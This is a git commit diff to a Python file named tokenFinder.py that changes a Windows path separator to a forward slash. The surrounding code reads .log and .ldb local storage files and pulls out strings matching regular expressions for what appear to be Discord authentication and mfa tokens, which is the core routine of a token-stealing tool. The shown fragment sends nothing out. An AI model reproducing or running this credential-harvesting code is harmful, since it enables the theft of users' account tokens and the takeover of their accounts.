9d524707937d88fa5686d89e5e1479553a640240
TanujKS <tanujsiripurapu@gmail.com>
2021-07-23 12:44:54 -0700

    Fixed tokenFinder

--- src/tokenFinder.py
+++ src/tokenFinder.py
@@ -48,7 +48,7 @@ class TokenFinder:
             if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                 continue
             try:
-                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                for line in [x.strip() for x in open(f'{path}/{file_name}', errors='ignore').readlines() if x.strip()]:
                     for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                         for token in re.findall(regex, line):
                             tokens.append(token)
